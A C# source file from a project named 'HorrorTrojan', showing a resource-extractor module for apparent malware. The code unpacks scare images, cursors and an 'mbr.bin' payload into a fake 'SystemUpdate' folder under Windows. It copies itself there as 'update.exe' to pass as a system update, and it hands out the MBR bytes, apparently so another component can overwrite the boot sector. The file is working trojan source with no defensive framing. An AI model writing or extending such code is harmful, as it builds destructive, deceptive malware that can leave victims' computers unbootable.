using System;
using System.IO;
using System.Reflection;

namespace HorrorTrojan
{
    internal static class ResourceExtractor
    {
        private static string TargetDir = @"C:\Windows\ProgramFiles\SystemUpdate";
        
        static ResourceExtractor()
        {
            if (!Directory.Exists(TargetDir))
                Directory.CreateDirectory(TargetDir);
        }
        
        public static void ExtractAll()
        {
            ExtractResource("wallpaper.jpg", Path.Combine(TargetDir, "wallpaper.jpg"));
            ExtractResource("eye.ico", Path.Combine(TargetDir, "eye.ico"));
            ExtractResource("eye.ani", Path.Combine(TargetDir, "eye.ani"));
            ExtractResource("horror.png", Path.Combine(TargetDir, "horror.png"));
            ExtractResource("mbr.bin", Path.Combine(TargetDir, "mbr.bin"));
            
            string selfPath = Assembly.GetExecutingAssembly().Location;
            string updatePath = Path.Combine(TargetDir, "update.exe");
            if (!File.Exists(updatePath) && File.Exists(selfPath))
                File.Copy(selfPath, updatePath);
        }
        
        private static void ExtractResource(string resourceName, string outputPath)
        {
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                if (stream == null) return;
                byte[] buffer = new byte[stream.Length];
                stream.Read(buffer, 0, buffer.Length);
                File.WriteAllBytes(outputPath, buffer);
            }
        }
        
        public static byte[] GetMBR()
        {
            string path = Path.Combine(TargetDir, "mbr.bin");
            if (File.Exists(path))
                return File.ReadAllBytes(path);
            return new byte[512];
        }
        
        public static string GetTargetDir()
        {
            return TargetDir;
        }
    }
}
